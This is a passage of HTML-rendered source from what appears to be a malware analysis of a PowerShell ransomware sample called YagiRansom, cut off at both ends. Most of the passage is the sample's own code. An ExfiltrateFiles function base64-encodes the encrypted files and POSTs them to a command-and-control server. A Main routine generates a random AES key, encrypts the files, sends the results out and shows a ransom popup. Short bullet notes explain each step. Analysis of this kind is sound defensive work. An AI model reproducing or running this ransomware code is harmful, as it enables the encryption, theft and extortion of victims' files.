0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cul>\n\u003Cli>Create a exclusion list for the ecnryption function.\u003C/li>\n\u003Cli>Browse through the folder and exclude all the files that have extension in the list, put the path in \u003Ccode>$i\u003C/code>\u003C/li>\n\u003Cli>Use AES on \u003Ccode>$i\u003C/code> with the key is \u003Ccode>$WiETm\u003C/code> and logs them in the format:  \u003Ccode>$Directory$slash$I26\" -Value \"[!] $i is now encrypted\u003C/code>\u003C/li>\n\u003Cli>Only log the file has \u003Ccode>!\u003C/code> and excluding the \u003Ccode>YagiRansom!\u003C/code>\u003C/li>\n\u003C/ul>\n\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"4\" aria-labelledby=\"exfiltratefiles\">\u003Ch4 id=\"exfiltratefiles\">ExfiltrateFiles\u003C/h4>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">function\u003C/span>\u003Cspan style=\"--shiki-light:#622CBC;--shiki-dark:#DBB7FF\"> ExfiltrateFiles\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">   Invoke-WebRequest\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">useb \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/files\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Method GET \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">2>&#x26;1>\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $null\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $RansomLogs \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Get-Content\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Directory$slash$I26\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> |\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Select-String\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"No files have been encrypted!\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ; \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$RansomLogs) {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   foreach\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($i \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">in\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> $\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Get-ChildItem\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $Directory \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">recurse \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">filter \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">*\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.enc \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">|\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Where-Object\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> { \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $_\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.PSIsContainer } \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">|\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> ForEach-Object\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> { \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$_\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.FullName })) {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $Pfile \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $i.split($slash)[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">-1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">] ; $B64file \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> R64Encoder \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-f\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $i ; $B64Name \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> R64Encoder \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">t $Pfile\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">      Invoke-WebRequest\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">useb \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/files/\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$B64Name\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Method POST \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Body $B64file \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">2>&#x26;1>\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $null\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   else\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> { $B64Name \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> R64Encoder \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">t \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"none.null\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ; \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Invoke-WebRequest\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">useb \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/files/\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$B64Name\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Method POST \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Body $B64file \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">2>&#x26;1>\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $null\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }}\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"function ExfiltrateFiles {\n   Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/files&#x22; -Method GET 2>&#x26;1> $null \n   $RansomLogs = Get-Content &#x22;$Directory$slash$I26&#x22; | Select-String &#x22;No files have been encrypted!&#x22; ; if (!$RansomLogs) {\n   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.enc | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {\n      $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile\n      Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/files/$B64Name&#x22; -Method POST -Body $B64file 2>&#x26;1> $null }}\n   else { $B64Name = R64Encoder -t &#x22;none.null&#x22; ; Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/files/$B64Name&#x22; -Method POST -Body $B64file 2>&#x26;1> $null }}\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cul>\n\u003Cli>Sends an initial request to the C2 server at \u003Ccode>$7CiB:$UFX/files\u003C/code> endpoint.\u003C/li>\n\u003Cli>Checks if any files have been encrypted by searching for the text “No files have been encrypted!” in the ransom note.\u003C/li>\n\u003Cli>If files have been encrypted:\n\u003Cul>\n\u003Cli>Finds all \u003Ccode>.enc\u003C/code> files in the directory and its subdirectories.\u003C/li>\n\u003Cli>For each encrypted file:\n\u003Cul>\n\u003Cli>Extracts the filename using \u003Ccode>split\u003C/code> with the system’s path separator.\u003C/li>\n\u003Cli>Encodes the file content using \u003Ccode>R64Encoder\u003C/code> with \u003Ccode>-f\u003C/code> flag.\u003C/li>\n\u003Cli>Encodes the filename using \u003Ccode>R64Encoder\u003C/code> with \u003Ccode>-t\u003C/code> flag.\u003C/li>\n\u003Cli>Uploads the encoded file to the C2 server using the encoded filename in the URL path\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003C/ul>\n\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"4\" aria-labelledby=\"main\">\u003Ch4 id=\"main\">Main\u003C/h4>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($Mode \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-eq\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"-d\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">   Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ; \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[!] Shutdowning....\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Red; sleep \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">else\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">   Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ;\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">   Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[+] Checking communication with C2 Server..\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Blue\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $DCe \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> GetStatus ; sleep \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $WiETm \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -join\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ( (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">48\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">..\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">57\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">65\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">..\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">90\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">97\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">..\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">122\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">|\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Get-Random\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Count \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">24\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> |\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> %\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {[\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">char\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$_\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">})\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">   Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[!] Encrypting ...\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Red\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   CreateReadme ; EncryptFiles ; \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($DCe) { SendResults ; sleep \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($ENyR \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-eq\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"-x\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[i] Exfiltrating ...\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Green\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      ExfiltrateFiles ; sleep \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$DCe) { \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[+] Saving logs in yaginote.txt..\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Blue }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   else\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> { \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[+] Sending logs to C2 Server..\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Blue }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -like\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"-demo\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { RemoveWallpaper ; PopUpRansom\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($PayNow \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-eq\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"True\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { SendPay ; SendOK } \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">else\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> { SendClose ; SendOK }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   else\u003C/span>\u003Cspan 